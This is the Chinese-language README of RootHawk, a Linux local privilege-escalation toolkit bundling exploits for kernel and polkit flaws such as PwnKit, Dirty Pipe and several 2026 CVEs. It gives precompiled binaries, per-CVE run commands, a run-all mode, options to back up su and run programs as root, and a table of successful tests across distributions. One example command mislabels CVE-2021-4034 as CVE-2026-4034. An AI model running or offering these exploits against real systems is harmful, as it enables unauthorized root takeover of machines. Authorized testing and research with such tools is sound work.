# RootHawk

RootHawk v2.0.0 是一个 Linux 本地安全测试终端工具，用 Go 编写，面向授权靶机、虚拟机和实验环境。

v2.0.0 新增了多个 Linux Kernel 本地提权模块，并继续支持按 CVE 名称或别名执行。

新增模块包括：
- `CVE-2026-43494 / PinTheft`：io_uring clone buffers、RDS zerocopy 与 GUP pin 引用相关利用链。
<img width="987" height="522" alt="image-20260701152016350" src="https://github.com/user-attachments/assets/e611dee1-f3a7-4780-8821-3d894618c16e" />

- `CVE-2026-43503 / DirtyClone`：XFRM ESP-in-UDP 与 page cache 写入相关利用链。
<img width="814" height="494" alt="image-20260701150224367" src="https://github.com/user-attachments/assets/66ea2656-1e81-49b7-ab37-0e1dfb46c70c" />

- `CVE-2026-46300 / Fragnesia`：xfrm/espintcp 与 TCP coalesce page cache replacement 相关利用链。
<img width="816" height="665" alt="image-20260701144820478" src="https://github.com/user-attachments/assets/9f989ba9-94b8-4f19-8064-8da1d540cfbe" />

- `CVE-2026-46331 / act_pedit partial COW`：net/sched act_pedit partial COW page cache corruption 相关利用链。
<img width="655" height="851" alt="image-20260701150439198" src="https://github.com/user-attachments/assets/e2d7815f-e35b-47ba-b681-8cb9209f70f9" />



## 工具测试
| 序号 | 操作系统  | 测试漏洞                   | 测试结果 | 说明                       |
| ---- | --------- | -------------------------- | -------- | -------------------------- |
| 1    | AnolisOS  | CVE-2026-31431 / Copy Fail | ✅ 成功   | 工具在该系统环境下测试通过 |
| 2    | openEuler | CVE-2026-31431 / Copy Fail | ✅ 成功   | 工具在该系统环境下测试通过 |
| 3    | 统信 UOS  | CVE-2026-31431 / Copy Fail | ✅ 成功   | 工具在该系统环境下测试通过 |
| 4    | openKylin | CVE-2026-31431 / Copy Fail | ✅ 成功   | 工具在该系统环境下测试通过 |
| 5    | Ubuntu    | CVE-2026-31431 / Copy Fail | ✅ 成功   | 工具在该系统环境下测试通过 |
| 6    | CentOS 7  | CVE-2021-4034 / PwnKit     | ✅ 成功   | 工具在该系统环境下测试通过 |

### 信创系统openEuler
<img width="833" height="720" alt="image" src="https://github.com/user-attachments/assets/d78ddc6b-26e5-4026-90d0-b8e9ad69c654" />

### DirtyFrag
```bash
./RootHawk-amd64 -e CVE-2026-43284
```
<img width="714" height="440" alt="image" src="https://github.com/user-attachments/assets/f4a5a64c-837d-4029-98d1-3797016a83c4" />

### CopyFai

```
./RootHawk-amd64 -e CVE-2026-31431
```
<img width="734" height="513" alt="image" src="https://github.com/user-attachments/assets/3ae169cf-e605-4fc8-b493-5a4b68c87179" />

### CVE-2021-4034

```
./RootHawk-amd64 -e CVE-2026-4034
```
<img width="601" height="240" alt="image" src="https://github.com/user-attachments/assets/923d18f2-1dda-4ee8-b402-3428a31e6bca" />



## 目录结构

```text
RootHawk/
├── bin/
│   ├── RootHawk-amd64
│   ├── RootHawk-arm64
│   └── RootHawk-386
├── pkg/
│   ├── exploits/
│   │   ├── cve20214034/
│   │   ├── cve20213560/
│   │   ├── cve20220847/
│   │   ├── cve202631431/
│   │   ├── cve202643284/
│   │   ├── cve202643494/
│   │   ├── cve202643503/
│   │   ├── cve202646300/
│   │   └── cve202646331/
│   │       ├── exploit.go
│   │       └── exp.c
│   ├── logger/
│   ├── payloads/
│   ├── pipe/
│   ├── shell/
│   └── state/
├── roothawk.go
├── go.mod
├── go.sum
├── NOTICE.md
└── README.md
```

## 已编译版本

```text
bin/RootHawk-amd64
bin/RootHawk-arm64
bin/RootHawk-386
bin/RootHawk-v2.0.0-amd64
bin/RootHawk-v2.0.0-arm64
bin/RootHawk-v2.0.0-386
```

Ubuntu amd64 虚拟机使用：

```bash
chmod +x RootHawk-amd64
./RootHawk-amd64 -help
```

## 使用方法

查看帮助：

```bash
./RootHawk-amd64 -help
```

查看模块列表：

```bash
./RootHawk-amd64 -list
```

执行指定 CVE：

```bash
./RootHawk-amd64 -e CVE-2022-0847
```

按顺序执行全部模块：

```bash
./RootHawk-amd64 -any
```

## 参数说明

```text
-list              显示当前集成的 CVE 模块
-version           显示版本号
-e <名称>          执行指定 CVE 或别名
-any               按列表顺序执行全部模块
-pk <路径>         指定 CVE-2021-4034 使用的 pkexec 路径，默认 /usr/bin/pkexec
-backup <路径>     CVE-2026-31431 执行前备份 su 到指定路径
-exec <路径>       CVE-2026-31431 提权后执行指定程序，而不是进入 su
-v                 尽量输出详细日志
-help              显示帮助
```

## 集成模块

| CVE 编号 | 常见名称/别名 | 漏洞类型/组件 |
| --- | --- | --- |
| CVE-2026-31431 | Copy Fail | Linux Kernel 本地提权，涉及 crypto / AF_ALG / algif_aead 相关逻辑问题。 |
| CVE-2026-43284 | Dirty Frag，也有人叫 CopyFail2 | Linux Kernel 本地提权，涉及 xfrm/esp、shared skb frags 等内核网络/数据包处理路径。 |
| CVE-2026-46300 | Fragnesia | Linux Kernel 本地提权，涉及 xfrm/espintcp 与 TCP coalesce page cache replacement 路径。 |
| CVE-2026-43494 | PinTheft | Linux Kernel 本地提权，涉及 io_uring clone buffers、RDS zerocopy 与 GUP pin 引用路径。 |
| CVE-2026-43503 | DirtyClone | Linux Kernel 本地提权，涉及 XFRM ESP-in-UDP 与 page cache 写入路径。 |
| CVE-2026-46331 | act_pedit partial COW | Linux Kernel 本地提权，涉及 net/sched act_pedit partial COW page cache corruption。 |
| CVE-2021-4034 | PwnKit | Polkit 的 pkexec 本地提权漏洞。 |
| CVE-2021-3560 | Polkit D-Bus 权限绕过 / Polkit Authentication Bypass | Polkit 本地提权，可通过 D-Bus 请求绕过凭据检查，提升权限；没有像 PwnKit 那样特别统一的短名字。 |
| CVE-2022-0847 | Dirty Pipe | Linux Kernel 本地提权，管道机制相关漏洞。 |

## 示例

```bash
./RootHawk-amd64 -list
./RootHawk-amd64 -version
./RootHawk-amd64 -e CVE-2021-4034
./RootHawk-amd64 -e CVE-2021-4034 -pk /usr/bin/pkexec
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak -exec /tmp/root-task
./RootHawk-amd64 -e CVE-2026-43284 -v
./RootHawk-amd64 -e CVE-2026-46300
./RootHawk-amd64 -e CVE-2026-43494
./RootHawk-amd64 -e CVE-2026-43503
./RootHawk-amd64 -e CVE-2026-46331
./RootHawk-amd64 -any
```

## 注意事项

- 仅在你有授权的环境中使用。
- `CVE-2026-43284`、`CVE-2026-46300`、`CVE-2026-43494`、`CVE-2026-43503`、`CVE-2026-46331` 和 `CVE-2021-4034` 模块运行时会在目标 Linux 上调用 `gcc` 或 `cc` 编译对应的 C 文件，目标机需要安装编译器。
- 运行会修改系统状态的模块后，建议在快照环境中测试，或按输出提示恢复/重启。
